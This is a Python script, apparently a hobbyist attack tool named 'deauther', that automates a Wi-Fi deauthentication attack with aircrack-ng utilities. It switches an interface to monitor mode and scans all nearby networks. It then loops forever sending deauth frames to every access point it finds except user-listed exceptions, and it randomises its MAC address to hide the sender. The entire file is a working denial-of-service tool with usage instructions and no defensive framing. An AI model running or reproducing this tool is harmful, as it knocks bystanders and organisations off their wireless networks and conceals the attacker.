import sys
import os
from datetime import datetime
from multiprocessing import Process

class Deauther:
	def __init__(self):
		self.interface = ""
		self.exceptions = ""
		self.networks = {}


	def how_to_use(self):
		if len(sys.argv) > 1:
			self.interface = sys.argv[-1]
			if len(sys.argv) > 2:
				self.exceptions = sys.argv[1].replace(" ", "").split(",")
				print(f"[*] Exceptions: {str(self.exceptions).replace('[', '').replace(']', '')}")
		else:
			print("How to use: python3 deauther.py interface mac,mac")
			exit()


	def configure(self):
		output = os.popen(f'iwconfig {self.interface}mon 1>/dev/null 2>/dev/null&&echo $?').read()
		if output != "0":
			out = os.popen(f"airmon-ng check kill 1>/dev/null 2>/dev/null&&airmon-ng start {self.interface}").read()
			if out == "0":
				print("[+] Finished Processes")
				print("[+] Monitoring Mode ON")
		else:
			print("[+] Monitoring Mode ON")

	def scanning(self):
		if not os.path.exists("wifis-01.csv"):
			print("[*] Scanning Networks...")
			os.system(f"timeout --preserve-status --foreground 60 airodump-ng --output-format csv -w wifis {self.interface}mon 1>/dev/null 2>/dev/null")
			print("[+] File 'wifis-01.csv' saved")
		else:
			print("[*] File wifis-01.csv loaded")


	def scraping(self):
		self.scanning()
		all_signals = []
		signals = {}
		with open("wifis-01.csv") as wifis:
			for line in wifis.readlines()[2:]:
				all_signals.append(line.split("\n"))
			for signal in all_signals:
				itens = signal[0].split(", ")
				try:
					if itens[0] != "Station MAC": 
						signals[itens[13]] = [itens[0], itens[3]]
					else:
						break
				except:
					pass

		return signals


	def separator(self):
		for key,value in self.scraping().items():
			if value[1] in self.networks.keys():
				self.networks[value[1]] = {key: value[0]}
			else:
				self.networks[value[1]] = {key: value[0]}


	def deauth(self, essid, bssid, channel):
		time = datetime.now().strftime("%H:%M:%S")
		status = os.popen(f"aireplay-ng --deauth 5 -a {bssid} {self.interface}mon").read()
		if "code 7" in status:
			if essid != "":
				print(f"\nDeauth: {essid}")
				print(f"        * TIME: {time}")
				print(f"        * BSSID: {bssid}")
				print(f"        * CHANNEL: {channel}")
			else:
				print(f"\nDeauth: Unknown")
				print(f"        * TIME: {time}")
				print(f"        * BSSID: {bssid}")
				print(f"        * CHANNEL: {channel}")
			return True
		return False


	def change_mac(self):
		status = os.popen(f"ifconfig {self.interface}mon down&&macchanger -r {self.interface}mon 1>/dev/null 2>/dev/null&&echo $?&&ifconfig {self.interface}mon up").read()
		if "0" in status:
			new_mac = os.popen(f"macchanger -s {self.interface}mon").read().split(" ")[4]
			print(f"\n[+] New Mac: {str(new_mac)}")
			return new_mac
		print("[-] Error when changing mac")
		return False


	def start(self):
		print("[+] Starting...")
		while True:
			counter = 0
			for channel,signals in self.networks.items():
				os.system(f"iwconfig {self.interface}mon channel {channel}")
				for essid,bssid in signals.items(): 
					if not bssid in self.exceptions:
						if counter == 0:
							self.change_mac()
							counter+=1
						proc = Process(target=self.deauth, args=(essid, bssid, channel))
						proc.start()
						proc.join()

	def slogan(self):
		print(" _    _______ _____  ___  _   _ _____ _   _  ___________")
		print("| |  | |  _  \  ___|/ _ \| | | |_   _| | | ||  ___| ___ \\")
		print("| |  | | | | | |__ / /_\ \ | | | | | | |_| || |__ | |_/ /")
		print("| |/\| | | | |  __||  _  | | | | | | |  _  ||  __||    /")
		print("\  /\  / |/ /| |___| | | | |_| | | | | | | || |___| |\ \\")
		print(" \/  \/|___/ \____/\_| |_/\___/  \_/ \_| |_/\____/\_| \_|")
		print("				Coded by Wellington Cimento\n")


	def infos(self):
		print(f"Networks: {len(self.networks.items())}\n")


	def run(self):
		self.slogan()
		self.separator()
		#self.infos()
		self.how_to_use()
		self.configure()
		self.start()


if __name__ == "__main__":
	deauther = Deauther()
	deauther.run()
